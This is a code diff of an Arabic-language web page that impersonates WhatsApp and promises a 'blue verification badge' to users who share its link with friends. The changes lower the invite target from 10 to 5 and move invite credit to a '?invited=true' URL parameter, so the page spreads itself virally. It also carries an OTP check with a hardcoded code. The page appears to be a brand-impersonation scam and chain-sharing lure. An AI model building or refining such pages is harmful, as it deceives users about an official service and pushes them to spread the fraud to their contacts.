@@ -141,7 +141,6 @@
             }
         }
 
-        /* ===== صفحة الدعوة ===== */
         .invite-card {
             background: white;
             border-radius: 16px;
@@ -248,7 +247,6 @@
             cursor: not-allowed;
         }
 
-        /* ===== باقي العناصر ===== */
         .chat-card {
             background: white;
             border-radius: 16px;
@@ -600,7 +598,7 @@
                 <h3>🎯 دعوة الأصدقاء</h3>
                 <p class="sub-text">
                     <strong>لتفعيل التوثيق والحصول على العلامة الزرقاء</strong>
-                    <br>يجب عليك مشاركة الرابط مع <strong>10 من أصدقائك</strong>
+                    <br>يجب عليك مشاركة الرابط مع <strong>5 من أصدقائك</strong>
                     <br>كل صديق يفتح الرابط يحسب لك دعوة
                 </p>
 
@@ -612,7 +610,7 @@
                     <div style="margin-top: 8px;">
                         <div style="display: flex; justify-content: space-between; font-size: 12px; color: #667781;">
                             <span>0</span>
-                            <span>10</span>
+                            <span>5</span>
                         </div>
                         <div style="width: 100%; height: 6px; background: #e9edef; border-radius: 10px; overflow: hidden; margin-top: 2px;">
                             <div id="progressFill" style="height: 100%; background: linear-gradient(90deg, #075e54, #25d366); border-radius: 10px; width: 0%; transition: width 0.5s ease;"></div>
@@ -638,7 +636,7 @@
 
             <div class="message-bubble incoming">
                 <div class="sender">WhatsApp</div>
-                <div class="text">👋 مرحباً! شارك الرابط مع 10 أصدقاء لتفعيل التوثيق</div>
+                <div class="text">👋 مرحباً! شارك الرابط مع 5 أصدقاء لتفعيل التوثيق</div>
                 <div class="time">الآن</div>
             </div>
         </div>
@@ -782,7 +780,7 @@
         let correctOtp = '123456';
         let isVerifying = false;
         let inviteCounter = 0;
-        const TARGET_INVITES = 10;
+        const TARGET_INVITES = 5;
         const LINK = 'https://whatsapp-verify-zeta.vercel.app/';
 
         // ===== Toast =====
@@ -807,35 +805,40 @@
             }
         }
 
+        // ===== التحقق من الرابط =====
+        function checkInviteFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const invited = params.get('invited');
+            if (invited === 'true') {
+                inviteCounter = Math.min(inviteCounter + 1, TARGET_INVITES);
+                updateInviteProgress();
+                showToast('✅ تمت دعوة جديدة! +1');
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+        }
+
         // ===== مشاركة الرابط =====
         async function shareLink() {
+            const shareLink = LINK + '?invited=true';
+
             try {
                 if (navigator.share) {
                     await navigator.share({
                         title: 'توثيق حساب WhatsApp',
                         text: '🔵 ساعدني في توثيق حسابي على WhatsApp واحصل على العلامة الزرقاء!',
-                        url: LINK
+                        url: shareLink
                     });
-                    inviteCounter = Math.min(inviteCounter + 1, TARGET_INVITES);
-                    updateInviteProgress();
-                    showToast('✅ تمت المشاركة! +1 دعوة');
+                    showToast('✅ تمت المشاركة! انتظر حتى يفتح أصدقاؤك الرابط');
                 } else {
-                    // Fallback للهواتف التي لا تدعم Web Share API
-                    await navigator.clipboard.writeText(LINK);
+                    await navigator.clipboard.writeText(shareLink);
                     showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك');
-                    inviteCounter = Math.min(inviteCounter + 1, TARGET_INVITES);
-                    updateInviteProgress();
                 }
             } catch (err) {
                 console.log('❌ فشل المشاركة:', err);
-                // لو المستخدم ألغى المشاركة، مش نحسبها
                 if (err.name !== 'AbortError') {
-                    // محاولة نسخ الرابط كحل بديل
                     try {
-                        await navigator.clipboard.writeText(LINK);
+                        await navigator.clipboard.writeText(shareLink);
                         showToast('✅ تم نسخ الرابط! شاركه مع أصدقائك');
-                        inviteCounter = Math.min(inviteCounter + 1, TARGET_INVITES);
-                        updateInviteProgress();
                     } catch (e) {
                         showToast('❌ فشل نسخ الرابط، حاول مرة أخرى');
                     }
@@ -1043,6 +1046,9 @@
                 verifyOtpBtn.click();
             }
         });
+
+        // ===== تشغيل التحقق من الرابط =====
+        checkInviteFromURL();
 
         // ===== تهيئة =====
         updateInviteProgress();
